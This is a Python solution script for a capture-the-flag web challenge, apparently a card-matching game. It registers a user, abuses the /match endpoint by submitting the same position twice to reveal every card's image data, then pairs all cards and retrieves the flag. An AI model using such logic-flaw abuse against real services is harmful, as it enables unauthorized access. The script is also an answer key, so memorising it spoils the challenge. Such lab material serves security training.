import requests
import sys
import json

if len(sys.argv) != 3:
    print("Please specify challenge URL and request bin URL")
    print("python solution.py <challenge-url> <username>")
    print("E.g, python solution.py http://127.0.0.1:8000")
    exit()

# Variables 
url = sys.argv[1]
username = sys.argv[2]
password = "P0aA9rSkogS!!"

# Set-up your main user
with requests.Session() as s:
    regParam = {'username':username,'password':password,'confirm':password,'submit':'Register'}
    response = s.post(url + '/register',json=regParam)
    loginParam = {'username':username,'password':password,'submit':'Login'}
    response = s.post(url + '/login', json=loginParam)

	# Fetch the game board 
    response = s.get(url + '/home')
    text = response.text

    # Make a match call for each card on the board 
    imgs = []
    for i in range(0,16):
        response = s.get(url + '/match?first_pos=' + str(i) + '&second_pos=' + str(i))
        try:
            data = json.loads(response.text)
            if "first_svgdata" in data:
                imgs.append(data["first_svgdata"])
        except json.JSONDecodeError as e:
            print(f"Error parsing JSON: {e}")
            exit()
    matching_positions = {}
    for i, x in enumerate(imgs):
        if x in matching_positions:
            matching_positions[x].append(i)
        else:
            matching_positions[x] = [i]
    print(matching_positions)
    match_url = url + "/match?"
    # # Match the cards
    for i in matching_positions:
     	pos_args = '&first_pos=' + str(matching_positions[i][0]) + '&second_pos=' + str(matching_positions[i][1])
     	match_url = url + '/match?' + pos_args
     	response = s.get(match_url)
     	print(response.text)

    # Get the flag
    response = s.get(url + '/flag')
    print(response.text)


